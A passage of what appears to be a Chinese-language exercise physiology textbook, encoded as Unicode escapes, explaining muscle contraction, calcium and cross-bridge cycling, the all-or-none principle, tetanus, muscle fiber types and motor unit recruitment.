28\u5916\u56f4\u808c\u539f\u7ea4\u7ef4\u4e4b\u95f4\uff0c\u5e76\u5728\u7ec6\u80de\u8868\u9762\u4e0e\u808c\u7ea4\u7ef4\u819c\u5f62\u6210\u8fde\u63a5\uff0c\u56e0\u6b64\uff0c\u52a8\u4f5c\u7535\u4f4d(\u4e00\u79cd\u7535\u795e\u7ecf\u8109\u51b2)\u5728\u91ca\u653e\u65f6\u51e0\u4e4e\u53ef\u4ee5\u540c\u65f6\u62b5\u8fbe\u7ec6\u80de\u8868\u9762\u4e0e\u6df1\u5904\u3002\u9499\u79bb\u5b50\u56e0\u6b64\u5f97\u4ee5\u88ab\u91ca\u653e\u4e8e\u808c\u8089\u4e2d\uff0c\u4ea7\u751f(\u808c\u8089)\u534f\u540c\u6536\u7f29\u3002 \u6765\u81ea\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u7535\u8109\u51b2(\u52a8\u4f5c\u7535\u4f4d)\u53d1\u51fa\u4fe1\u53f7\uff0c\u9499\u79bb\u5b50\u4ece\u808c\u8d28\u7f51\u91ca\u653e\u5230\u808c\u539f\u7ea4\u7ef4\u4e2d\uff0c\u4f7f\u808c\u8089\u4ea7\u751f\u5f20\u529b\u3002 \u6700\u7b80\u5355\u5730\u6765\u8bb2\uff0c\u808c\u4e1d\u6ed1\u884c\u5b66\u8bf4\u63cf\u8ff0\u4e86\u808c\u8282\u4e24\u7aef\u7684\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u808c\u7403\u86cb\u767d\u4e1d\u4e0a\u5411\u5185\u4fa7\u6ed1\u52a8\uff0c\u5e76\u5c06Z\u7ebf\u5411\u808c\u8282\u4e2d\u592e\u62c9\u52a8\uff0c\u4ece\u800c\u7f29\u77ed\u808c\u7ea4\u7ef4\uff08\u56fe1.7)\u7684\u8fc7\u7a0b\u3002\u5f53\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u808c\u7403\u86cb\u767d\u4e1d\u4e0a\u6ed1\u52a8\u65f6\uff0cH\u533a\u548cI\u5e26\u90fd\u7f29\u77ed\u3002\u808c\u7403\u86cb\u767d\u6a2a\u6865\u6446\u52a8\uff08\u6216\u626d\u52a8\uff09\u5bf9\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u7275\u5f15\u4f5c\u7528\uff0c\u9020\u6210\u4e86\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u6d3b\u52a8\u3002\u7531\u4e8e\u808c\u7403\u86cb\u767d\u6a2a\u6865\u6bcf\u6b21\u6446\u52a8\u53ea\u80fd\u9020\u6210\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u5fae\u5c0f\u4f4d\u79fb\uff0c\u6574\u6761\u808c\u8089\u4e0a\u7684\u8bf8\u591a\u6a2a\u6865\u5fc5\u987b\u5feb\u901f\u3001\u91cd\u590d\u6446\u52a8\uff0c\u624d\u80fd\u9020\u6210\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u660e\u663e\u4f4d\u79fb\u3002 \u808c\u8089\u6d3b\u52a8\u7684\u51e0\u79cd\u9636\u6bb5 \u9759\u606f\u9636\u6bb5 \u9759\u606f\u9636\u6bb5 \u5728\u6b63\u5e38\u9759\u606f\u65f6\uff0c\u5f88\u5c11\u4f1a\u6709\u9499\u79bb\u5b50\u51fa\u73b0\u5728\u808c\u539f\u7ea4\u7ef4\u4e2d\uff08\u5927\u90e8\u5206\u7684\u9499\u79bb\u5b50\u5b58\u50a8\u5728\u808c\u8d28\u7f51\u4e2d)\uff0c\u56e0\u6b64\u5f88\u5c11\u6709\u808c\u7403\u86cb\u767d\u6a2a\u6865\u4e0e\u808c\u52a8\u86cb\u767d\u8fde\u63a5\u3002\u5373\u4f7f\u808c\u52a8\u86cb\u767d\u4e0a\u7684\u7ed3\u5408\u70b9\u88ab\u906e\u76d6\uff0c\u808c\u52a8\u86cb\u767d\u4e0e\u808c\u7403\u86cb\u767d\u4ecd\u4e0e\u5f7c\u6b64\u4fdd\u6301\u5fae\u5f31\u8fde\u63a5\u3002\u5728\u50a8\u5b58\u7684\u9499\u79bb\u5b50\u88ab\u91ca\u653e\u4e14\u808c\u52a8\u86cb\u767d\u7ed3\u5408\u70b9\u88ab\u66b4\u9732\u540e\uff0c\u8be5\u8fde\u63a5\u4f1a\u53d8\u5f97\u7262\u56fa\uff0c\u808c\u8089\u5f20\u529b\u4e5f\u56e0\u6b64\u4ea7\u751f\u3002 \u5174\u594b\u4e00\u6536\u7f29\u8026\u8054\u9636\u6bb5 \u5174\u594b\u4e00\u6536\u7f29\u8026\u8054\u9636\u6bb5 \u808c\u7403\u86cb\u767d\u6a2a\u6865\u6536\u7f29\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u4e0e\u808c\u52a8\u86cb\u767d\u4e1d\u5f62\u6210\u8fde\u63a5\u3002\u5f53\u808c\u8d28\u7f51\u53d7\u5230\u523a\u6fc0\u800c\u91ca\u653e\u9499\u79bb\u5b50\u65f6\uff0c\u9499\u79bb\u5b50\u4e0e\u808c\u9499\u86cb\u767d\u76f8\u7ed3\u5408\u3002\u808c\u9499\u86cb\u767d\u662f\u4e00\u79cd\u6309\u89c4\u5f8b\u95f4\u9694\u6392\u5217\u5728\u808c\u52a8\u86cb\u767d\u4e1d\u8868\u9762\uff0c\u5e76\u5bf9\u9499\u79bb\u5b50\u5177\u6709\u4eb2\u548c\u529b\u7684\u86cb\u767d\u8d28\u3002\u9499\u79bb\u5b50\u548c\u808c\u9499\u86cb\u767d\u7684\u7ed3\u5408\u4f1a\u5bfc\u81f4\u53e6\u5916\u4e00\u4e2a\u86cb\u767d\u8d28\u5206\u5b50\u4e00\u539f\u808c\u7403\u86cb\u767d\u4ea7\u751f\u4f4d\u79fb\u3002\u539f\u808c\u7403\u86cb\u767d\u6cbf\u7740\u53cc\u87ba\u65cb\u7ed3\u6784\u7684\u808c\u52a8\u86cb\u767d\u4e1d\u6c9f\u69fd\u5206\u5e03\u3002\u6b64\u65f6\u808c\u7403\u86cb\u767d\u6a2a\u6865\u4fbf\u53ef\u4ee5\u66f4\u8fc5\u901f\u5730\u4e0e\u808c\u52a8\u86cb\u767d\u4e1d\u8fde\u63a5\uff0c\u4ece\u800c\u5728\u808c\u52a8\u86cb\u767d\u4e1d\u88ab\u62c9\u5411\u808c\u8282\u4e2d\u592e\u65f6\u4ea7\u751f\u808c\u529b\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4e00\u5757\u808c\u8089\u4ea7\u751f\u7684\u77ac\u65f6\u529b\u91cf\u4e0e\u6b64\u65f6\u808c\u8089\u6a2a\u622a\u9762\u4e2d\u4e0e\u808c\u52a8\u86cb\u767d\u4e1d\u7ed3\u5408\u7684\u6a2a\u6865\u6570\u91cf\u76f4\u63a5\u76f8\u5173\u3002 \u808c\u8089\u4ea7\u751f\u7684\u77ac\u65f6\u529b\u91cf\u53d6\u51b3\u4e8e\u6b64\u65f6\u4e0e\u808c\u52a8\u86cb\u767d\u7ed3\u5408\u7684\u808c\u7403\u86cb\u767d\u6a2a\u6865\u6570\u91cf \u3002 \u6536\u7f29\u9636\u6bb5 \u6536\u7f29\u9636\u6bb5 \u6a2a\u6865\u4f7f\u808c\u52a8\u86cb\u767d\u4e1d\u4ea7\u751f\u62c9\u52a8\u7684\u8fc7\u7a0b\u88ab\u79f0\u4e3a \u52a8\u529b\u51b2\u7a0b \uff0c\u5176\u6240\u9700\u7684\u80fd\u91cf\u6765\u81ea\u4e09\u78f7\u9178\u817a\u82f7\uff08ATP)\u6c34\u89e3\uff08\u5206\u89e3\uff09\u4e3a\u4e8c\u78f7\u9178\u817a\u82f7(ADP)\u548c\u78f7\u9178\u76d0(P)\u7684\u8fc7\u7a0b\u3002\u8fd9\u4e00\u8fc7\u7a0b\u7531\u6a2a\u6865\u4e0a\u7684ATP\u9176\u50ac\u5316\u3002\u4e3a\u4e86\u4f7f\u808c\u7403\u86cb\u767d\u6a2a\u6865\u7684\u7403\u72b6\u5934\u8131\u79bb\u808c\u52a8\u86cb\u767d\u7ed3\u5408\u70b9\u5e76\u56de\u5230\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u53e6\u4e00\u4e2aATP\u5206\u5b50\u5fc5\u987b\u53d6\u4ee3\u7403\u72b6\u5934\u4e0a\u7684ADP\u3002\u8fd9\u4f7f\u808c\u8089\u5f97\u4ee5\u7ee7\u7eed\u6536\u7f29\uff08\u5982\u679c\u6709\u53ef\u7528\u7684\u9499\u79bb\u5b50\u4e0e\u808c\u9499\u86cb\u767d\u7ed3\u5408)\u6216\u653e\u677e\uff08\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u9499\u79bb\u5b50)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u9499\u79bb\u5b50\u5728\u9aa8\u9abc\u808c\u4e2d\u9664\u4e86\u63a7\u5236\u6536\u7f29\u4ee5\u5916\u8fd8\u5177\u6709\u5176\u4ed6\u91cd\u8981\u4f5c\u7528\uff0c\u5305\u62ec\u65e0\u6c27\u7cd6\u9175\u89e3\u548c\u6709\u6c27\u6c27\u5316\u4ee3\u8c22\uff0c \u4ee5\u53ca\u86cb\u767d\u8d28\u5408\u6210\u548c\u964d\u89e3\u3002 \u518d\u84c4\u80fd\u9636\u6bb5 \u518d\u84c4\u80fd\u9636\u6bb5 \u53ea\u6709\u5f53\u8fd9\u4e00\u5e8f\u5217\u5728\u6574\u5757\u808c\u8089\u4e2d\u4e0d\u65ad\u91cd\u590d\u53d1\u751f\u65f6\uff0c\u624d\u80fd\u4ea7\u751f\u660e\u663e\u7684\u808c\u8089\u6536\u7f29\uff1a\u9499\u79bb\u5b50\u4e0e\u808c\u9499\u86cb\u767d\u7ed3\u5408\uff1b\u808c\u7403\u86cb\u767d\u6a2a\u6865\u4e0e\u808c\u52a8\u86cb\u767d\u7ed3\u5408\uff1b\u52a8\u529b\u51b2\u7a0b\uff1b\u808c\u7403\u86cb\u767d\u4e0e\u808c\u52a8\u86cb\u767d\u5206\u79bb\uff1b\u808c\u7403\u86cb\u767d\u7403\u72b6\u5934\u590d\u4f4d\u3002\u53ea\u8981\u808c\u539f\u7ea4\u7ef4\u4e2d\u6709\u53ef\u7528\u7684\u9499\u79bb\u5b50\u3001\u6709\u53ef\u4ee5\u5e2e\u52a9\u808c\u7403\u86cb\u767d\u4e0e\u808c\u52a8\u86cb\u767d\u5206\u79bb\u7684ATP\uff0c\u4ee5\u53ca\u8db3\u591f\u591a\u7684\u6d3b\u8dc3\u7684\u808c\u7403\u86cb\u767dATP\u9176\u50ac\u5316ATP\u7684\u5206\u89e3\uff0c\u90a3\u4e48\u8be5\u8fc7\u7a0b\u4fbf\u53ef\u4ee5\u4e0d\u65ad\u5730\u6301\u7eed\u4e0b\u53bb\u3002 \u653e\u677e\u9636\u6bb5 \u653e\u677e\u9636\u6bb5 \u5f53\u6765\u81ea\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u523a\u6fc0\u505c\u6b62\u65f6\uff0c\u808c\u8089\u4fbf\u4f1a\u653e\u677e\u3002\u9499\u79bb\u5b50\u88ab\u56de\u6536\u5230\u808c\u8d28\u7f51\uff0c \u8fd9\u5c06\u963b\u6b62\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u4e4b\u95f4\u5f62\u6210\u8fde\u63a5\u3002\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u56de\u5230\u5206\u79bb\u72b6\u6001\u4f7f\u808c\u8089\u653e\u677e\u3002 \u808c\u8089\u7684\u6fc0\u6d3b \u5f53\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u6fc0\u53d1\u8109\u51b2\u4fe1\u53f7\u6216\u52a8\u4f5c\u7535\u4f4d\u65f6\uff0c\u5b83\u6240\u652f\u914d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u540c\u65f6\u88ab\u6fc0\u6d3b\u5e76\u4ea7\u751f\u529b\u3002\uff08\u795e\u7ecf)\u5bf9\u808c\u8089\u7684\u63a7\u5236\u7a0b\u5ea6\u53d6\u51b3\u4e8e\u6bcf\u4e2a\u8fd0\u52a8\u5355\u4f4d\u5305\u542b\u7684\u808c\u7ea4\u7ef4\u6570\u91cf\u3002\u6709\u4e9b\u5fc5\u987b\u4ee5\u6781\u9ad8\u7cbe\u5ea6\u5de5\u4f5c\u7684\u808c\u8089\uff0c\u4f8b\u5982\u773c\u90e8\u808c\u8089\uff0c\u6bcf\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u6700\u5c11\u53ef\u80fd\u53ea\u63a7\u5236\u4e00\u6761\u808c\u7ea4\u7ef4\u3002\u8fd9\u4e9b\u5c0f\u808c\u8089\u4e2d\u6fc0\u6d3b\u7684\u8fd0\u52a8\u5355\u4f4d\u7684\u6570\u91cf\u7684\u6539\u53d8\uff0c \u53ef\u4ee5\u4ea7\u751f\u4f7f\u773c\u7403\u7cbe\u51c6\u79fb\u52a8\u7684\u529b\u91cf\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c \u79fb\u52a8\u817f\u90e8\u7684\u80a1\u56db\u5934\u808c\u5bf9\u7cbe\u5ea6\u7684\u8981\u6c42\u5c31\u4f4e\u5f97\u591a\uff0c \u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u53ef\u80fd\u652f\u914d\u6570\u767e\u6761\u808c\u7ea4\u7ef4\u3002 \u5168\u6216\u65e0\u539f\u5219 \u6cbf\u8fd0\u52a8\u795e\u7ecf\u5143\u4f20\u5bfc\u7684\u52a8\u4f5c\u7535\u4f4d\uff08\u7535\u6d41\uff09\u4e0d\u80fd\u76f4\u63a5\u6fc0\u6d3b\u808c\u7ea4\u7ef4\uff0c\u800c\u662f\u901a\u8fc7\u5316\u5b66\u4f20\u9012\u65b9\u5f0f\u6765\u6fc0\u6d3b\u88ab\u652f\u914d\u7684\u808c\u7ea4\u7ef4\u3002\u5f53\u52a8\u4f5c\u7535\u4f4d\u4f20\u5230\u8f74\u7a81\u672b\u68a2\u65f6\uff0c\u5f15\u8d77\u795e\u7ecf\u9012\u8d28 \u4e59\u9170\u80c6\u78b1 \u7684\u91ca\u653e\uff0c\u5176\u901a\u8fc7\u6269\u6563\u7a7f\u8fc7\u795e\u7ecf\u808c\u8089\u63a5\u5934\uff0c\u5f15\u8d77\u808c\u7ea4\u7ef4\u819c\u7684\u5174\u594b\u3002\u4e00\u65e6\u91ca\u653e\u7684\u4e59\u9170\u80c6\u78b1\u8fbe\u5230\u9608\u503c\uff0c\u52a8\u4f5c\u7535\u4f4d\u4fbf\u4f1a\u6cbf\u7740\u808c\u7ea4\u7ef4\u819c\u4ea7\u751f\uff0c\u4f7f\u808c\u7ea4\u7ef4\u6536\u7f29\u3002\u540c\u4e00\u8fd0\u52a8\u5355\u4f4d\u4e2d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u540c\u65f6\u6536\u7f29\u5e76\u4ea7\u751f\u529b\u3002\u6ca1\u6709\u8bc1\u636e\u8868\u660e\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u523a\u6fc0\u53ea\u4f1a\u4f7f\u5176\u63a7\u5236\u7684\u90e8\u5206\u808c\u7ea4\u7ef4\u6536\u7f29\u3002\u540c\u6837\u5730\uff0c\u66f4\u5f3a\u7684\u52a8\u4f5c\u7535\u4f4d\u4e5f\u4e0d\u80fd\u5f15\u8d77\u66f4\u5f3a\u7684\u6536\u7f29\u3002\u8fd9\u79cd\u73b0\u8c61\u88ab\u79f0\u4e3a\u808c\u8089\u6536\u7f29\u7684\u5168\u6216\u65e0\u539f\u5219\u3002 \u5f3a\u76f4 \u6bcf\u6b21\u8fd0\u52a8\u795e\u7ecf\u5143\u4f20\u5bfc\u7684\u52a8\u4f5c\u7535\u4f4d\u4f1a\u5bfc\u81f4\u8fd0\u52a8\u5355\u4f4d\u5185\u808c\u7ea4\u7ef4\u7684\u77ed\u6682\u6fc0\u6d3b\uff0c\u56e0\u6b64\u800c\u4ea7\u751f\u7684\u77ed\u6682\u6536\u7f29\u88ab\u79f0\u4e3a\u5355\u6536\u7f29\u3002\u808c\u7ea4\u7ef4\u819c\u7684\u6fc0\u6d3b\u5bfc\u81f4\u808c\u7ea4\u7ef4\u5185\u9499\u79bb\u5b50\u7684\u91ca\u653e\uff0c\u5e76\u4e14\u5982\u524d\u6587\u6240\u8ff0\uff0c\u4ea7\u751f\u6536\u7f29\u3002\u5982\u679c\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u76f8\u4e92\u7275\u62c9\u6709\u963b\u529b\u5b58\u5728\uff0c\u4fbf\u4f1a\u4ea7\u751f\u529b\u3002\u5c3d\u7ba1\u5728\u4e00\u6b21\u5355\u6536\u7f29\u4e2d\u91ca\u653e\u7684\u9499\u79bb\u5b50\u8db3\u4ee5\u4f7f\u808c\u52a8\u86cb\u767d\u548c\u808c\u7403\u86cb\u767d\u5145\u5206\u6fc0\u6d3b\uff0c\u5e76\u5728\u808c\u7ea4\u7ef4\u4e2d\u4ea7\u751f\u6700\u5927\u529b\uff0c\u4f46\u5728\u808c\u7ea4\u7ef4\u5f20\u529b\u8fbe\u5230\u6700\u5927\u503c\u4e4b\u524d\uff0c \u9499\u79bb\u5b50\u4f1a\u88ab\u6e05\u9664\uff0c\u808c\u8089\u8fdb\u800c\u653e\u677e\uff08\u56fe1.8\u4e2d\u7684\u66f2\u7ebfa)\u3002\u5982\u679c\u5728\u808c\u7ea4\u7ef4\u5b8c\u5168\u653e\u677e\u4e4b\u524d\uff0c\u8fd0\u52a8\u795e\u7ecf\u518d\u6b21\u4f20\u51fa\u523a\u6fc0\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u6b21\u5355\u6536\u7f29\uff0c\u90a3\u4e48\u4e24\u6b21\u5355\u6536\u7f29\u7684\u529b\u4f1a\u53e0\u52a0\uff0c\u5e76\u9020\u6210\u5927\u4e8e\u4e00\u6b21\u5355\u6536\u7f29\u7684\u529b\uff08\u56fe1.8\u4e2d\u7684\u66f2\u7ebfb)\u3002\u51cf\u5c11\u5355\u6536\u7f29\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4f1a\u9020\u6210\u66f4\u591a\u7684\u6a2a\u6865\u8fde\u63a5\u4e0e\u66f4\u5927\u7684\u529b\u3002\u7535\u8109\u51b2\u523a\u6fc0\u53ef\u4ee5\u4ee5\u6781\u9ad8\u7684\u9891\u7387\u4f20\u5bfc\uff0c \u4f7f\u5355\u6536\u7f29\u5f00\u59cb\u5408\u5e76\u5e76\u4e14\u6700\u7ec8\u5b8c\u5168\u878d\u5408\uff0c\u8be5\u73b0\u8c61\u88ab\u79f0\u4e3a \u5f3a\u76f4 \uff08\u56fe1.8\u4e2d\u7684\u66f2\u7ebfc\u548c\u66f2\u7ebfd) \u8fd9\u662f\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u4e2d\u6240\u80fd\u4ea7\u751f\u7684\u6700\u5927\u529b\u3002 \u808c\u7ea4\u7ef4\u7c7b\u578b \u6700\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\u6309\u6536\u7f29\u901f\u5ea6\u5c06\u808c\u7ea4\u7ef4\u5206\u4e3a \u6162\u808c\u7ea4\u7ef4 \u548c \u5feb\u808c\u7ea4\u7ef4 \u3002\u7531\u4e8e\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u5168\u90e8\u51fa\u540c\u4e00\u79cd\u7c7b\u578b\u7684\u808c\u7ea4\u7ef4\u7ec4\u6210\uff0c\u56e0\u6b64\u8fd0\u52a8\u5355\u4f4d\u4e5f\u53ef\u4f7f\u7528\u8be5\u5206\u7c7b\u6807\u51c6\u6765\u5212\u5206\u3002\u5feb\u808c\u8fd0\u52a8\u5355\u4f4d\u4ea7\u751f\u529b\u548c\u653e\u677e\u90fd\u5f88\u8fc5\u901f\uff0c\u56e0\u6b64\u6536\u7f29\u65f6\u95f4\u77ed\u3002\u76f8\u53cd\uff0c\u6162\u808c\u8fd0\u52a8\u5355\u4f4d\u4ea7\u751f\u529b\u548c\u653e\u677e\u90fd\u8f83\u6162\uff0c\u56e0\u6b64\u6536\u7f29\u65f6\u95f4\u76f8\u5bf9\u8f83\u957f\u3002 \u901a\u5e38\u7528 \u7ec4\u7ec7\u5316\u5b66\u67d3\u8272\u6cd5 \u5c06 \u808c\u7403\u86cb\u767dATP\u9176\u6210\u5206 \u7740\u8272\uff0c\u4ece\u800c\u533a\u5206\u6162\u808c\u7ea4\u7ef4\u548c\u5feb\u808c\u7ea4\u7ef4\u3002 \u867d\u7136\u8fd9\u4e00\u65b9\u6cd5\u53ef\u4ee5\u5bf9\u591a\u79cd\u808c\u7ea4\u7ef4\u67d3\u8272\uff0c\u4f46\u901a\u5e38\u4e3b\u8981\u5206\u4e3a|\u578b\uff08\u6162\u808c\u7ea4\u7ef4\uff09\u3001\u2161a\u578b\uff08\u5feb\u808c\u7ea4\u7ef4\uff09 \u548c\u2161x\u578b\uff08\u5feb\u808c\u7ea4\u7ef4\uff09\u3002\u53e6\u4e00\u4e2a\u66f4\u5177\u4f53\u7684\u65b9\u6cd5\u662f\u786e\u5b9a\u808c\u7403\u86cb\u767d\u91cd\u94fe\u86cb\u767d\u7684\u6570\u91cf\uff1b\u5176\u547d\u540d\u6cd5\u7c7b\u4f3c\u4e8e\u808c\u7403\u86cb\u767dATP\u9176\u7684\u547d\u540d\u65b9\u6cd5\u3002 I\u578b\u808c\u7ea4\u7ef4\u548c\u2161\u578b\u808c\u7ea4\u7ef4\u673a\u7406\u4e0a\u7684\u5dee\u5f02\u9020\u6210\u4e86\u5b83\u4eec\u5728\u6536\u7f29\u65f6\u5bf9\u80fd\u91cf\u7684\u9700\u6c42\u548c\u4f9b\u5e94\uff0c\u4ee5\u53ca\u6297\u75b2\u52b3\u65b9\u9762\u7684\u533a\u522b\u3002 \u2160\u578b\u808c\u7ea4\u7ef4\u7684\u7279\u70b9 I\u578b\u808c\u7ea4\u7ef4\u901a\u5e38\u6548\u7387\u8f83\u9ad8\u4e14\u6297\u75b2\u52b3\uff0c\u540c\u65f6\u6709\u8f83\u9ad8\u7684\u6709\u6c27\u4f9b\u80fd\u80fd\u529b\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u808c\u7403\u86cb\u767dATP\u9176\u6d3b\u6027\u8f83\u4f4e\u548c\u65e0\u6c27\u7206\u53d1\u529b\u5dee\u7684\u7279\u70b9\uff0c\u5feb\u901f\u4ea7\u751f\u808c\u529b\u7684\u80fd\u529b\u6709\u9650\u3002 \u2161\u578b\u808c\u7ea4\u7ef4\u7684\u7279\u70b9 \u2161\u578b\u808c\u7ea4\u7ef4\u5219\u76f8\u53cd\uff0c\u5176\u7279\u70b9\u8868\u73b0\u4e3a\u4f4e\u6548\u7387\u3001\u6613\u75b2\u52b3\u3001\u6709\u6c27\u80fd\u529b\u5dee\u3001\u80fd\u5feb\u901f\u4ea7\u751f\u808c\u529b\u3001\u808c\u7403\u86cb\u767dATP\u9176\u6d3b\u6027\u9ad8\u548c\u65e0\u6c27\u7206\u53d1\u529b\u5f3a\u3002 \u2161a\u578b\u808c\u7ea4\u7ef4\u548c\u2161x\u578b\u808c\u7ea4\u7ef4\u7684\u5dee\u5f02 \u2161a\u578b\u808c\u7ea4\u7ef4\u548c\u2161x\u578b\u808c\u7ea4\u7ef4\u7684\u4e3b\u8981\u5dee\u5f02\u5728\u4e8e\u5b83\u4eec\u7684\u6709\u6c27\u6c27\u5316\u80fd\u91cf\u4f9b\u5e94\u80fd\u529b\u3002\u4f8b\u5982\uff0c\u2161a\u578b\u808c\u7ea4\u7ef4\u5177\u6709\u66f4\u5f3a\u7684\u6709\u6c27\u4ee3\u8c22\u80fd\u529b\uff0c\u5e76\u4e14\u56f4\u7ed5\u5b83\u4eec\u7684\u6bdb\u7ec6\u8840\u7ba1\u4e5f\u6bd4\u2161x\u578b\u66f4\u591a\uff0c\u56e0\u6b64\u663e\u793a\u51fa\u66f4\u5f3a\u7684\u6297\u75b2\u52b3\u6027\u3002 \u57fa\u4e8e\u8fd9\u4e9b\u5dee\u5f02\uff0c\u5e76\u4e0d\u96be\u7406\u89e3\uff1a\u7ef4\u6301\u59ff\u6001\u7684\u7a33\u5b9a\u808c\uff0c\u4f8b\u5982\u6bd4\u76ee\u9c7c\u808c\uff0c \u5176I\u578b\u808c\u7ea4\u7ef4\u542b\u91cf\u8f83\u9ad8\uff1b\u800c\u8f83\u5927\u7684\u808c\u8089\uff0c\u53c8\u88ab\u79f0\u4e3a\u8fd0\u52a8\u808c\u8089\uff0c\u4f8b\u5982\u80a1\u56db\u5934\u808c\uff0c\u5219\u662fI\u578b\u808c\u7ea4\u7ef4\u548cI\u578b\u808c\u7ea4\u7ef4\u7684\u6df7\u5408\u4f53\uff0c\u4ee5\u4f7f\u5176\u80fd\u540c\u65f6\u5b8c\u6210\u4f4e\u529f\u7387\u548c\u9ad8\u529f\u7387\u8f93\u51fa\u7684\u6d3b\u52a8\uff08\u4f8b\u5982\u6162\u8dd1\u548c\u51b2\u523a)\u3002\u6709\u5173\u808c\u7ea4\u7ef4\u7c7b\u578b\u7684\u4e3b\u8981\u7279\u6027\u7684\u6982\u8ff0\u89c1\u88681.1\u3002 \u8fd0\u52a8\u5355\u4f4d\u52df\u96c6\u6a21\u5f0f \u4e00\u5757\u808c\u8089\u53ef\u4ee5\u6839\u636e\u9700\u8981\u5b8c\u6210\u7684\u7279\u5b9a\u4efb\u52a1\u6765\u6539\u53d8\u529b\u91cf\u8f93\u51fa\u7684\u5927\u5c0f\u3002\u8fd9\u79cd\u8c03\u8282\u80fd\u529b\u5bf9\u4e8e\u534f\u8c03\u4e14\u6d41\u7545\u5730\u5b8c\u6210\u52a8\u4f5c\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002 \u901a\u8fc7\u6539\u53d8\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u7684\u9891\u7387 \u808c\u529b\u80fd\u4ee5\u4e24\u79cd\u65b9\u5f0f\u8c03\u8282\u3002\u4e00\u79cd\u662f\u901a\u8fc7\u6539\u53d8\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u7684\u9891\u7387\u3002\u5982\u679c\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u4e00\u6b21\uff0c\u5f15\u8d77\u7684\u5355\u6536\u7f29\u4e0d\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u529b\u3002\u7136\u800c\uff0c\u5982\u679c\u6fc0\u6d3b\u9891\u7387\u589e\u52a0\u4f7f\u5355\u6536\u7f29\u4ea7\u751f\u7684\u529b\u5f00\u59cb\u53e0\u52a0\u6216\u878d\u5408\uff0c\u8fd0\u52a8\u5355\u4f4d\u4ea7\u751f\u7684\u5408\u529b\u5c31\u5927\u5f97\u591a\u3002\u8fd9\u79cd\u6539\u53d8\u529b\u91cf\u8f93\u51fa\u5927\u5c0f\u7684\u65b9\u6cd5\u5728\u5c0f\u808c\u8089\u7fa4\u4e2d\u5c24\u5176\u91cd\u8981\uff0c\u4f8b\u5982\u624b\u90e8\u808c\u7fa4\u3002\u5373\u4f7f\u5728\u8f83\u4f4e\u7684\u529b\u91cf\u8f93\u51fa\u4e0b\uff0c\u8fd9\u4e9b\u808c\u8089\u4e2d\u7684\u5927\u591a\u6570\u8fd0\u52a8\u5355\u4f4d\u4e5f\u90fd\u88ab\u6fc0\u6d3b\uff0c\u5c3d\u7ba1\u9891\u7387\u8f83\u4f4e\u3002\u6574\u4e2a\u808c\u8089\u7684\u529b\u91cf\u8f93\u51fa\u968f\u7740\u8fd0\u52a8\u5355\u4f4d\u7684\u6fc0\u6d3b\u9891\u7387\u589e\u52a0\u800c\u53d8\u5927\u3002 \u901a\u8fc7\u6539\u53d8\u6fc0\u6d3b\u8fd0\u52a8\u5355\u4f4d\u7684\u6570\u91cf \u53e6\u4e00\u79cd\u6539\u53d8\u808c\u529b\u7684\u65b9\u6cd5\u662f\u901a\u8fc7\u6539\u53d8\u6fc0\u6d3b\u8fd0\u52a8\u5355\u4f4d\u7684\u6570\u91cf\u6765\u589e\u5927\u529b\uff0c\u8fd9\u4e00\u8fc7\u7a0b\u79f0\u4e3a\u52df\u96c6\u3002\u5728\u5927\u808c\u8089\u7fa4\uff08\u4f8b\u5982\u5927\u817f\u7684\u808c\u7fa4)\u4e2d\uff0c\u5f53\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u65f6\u5df2\u7ecf\u5904\u4e8e\u63a5\u8fd1\u5f3a\u76f4\u7684\u9891\u7387\u3002\u56e0\u6b64\uff0c\u529b\u91cf\u8f93\u51fa\u7684\u589e\u52a0\u662f\u901a\u8fc7\u52df\u96c6\u989d\u5916\u7684\u8fd0\u52a8\u5355\u4f4d\u6570\u91cf\u5b9e\u73b0\u7684\u3002 \u4e0d\u540c\u7c7b\u578b\u808c\u7ea4\u7ef4\u5728\u4e0d\u540c\u4f53\u80b2\u9879\u76ee\u4e2d\u7684\u76f8\u5bf9\u53c2\u4e0e\u7a0b\u5ea6 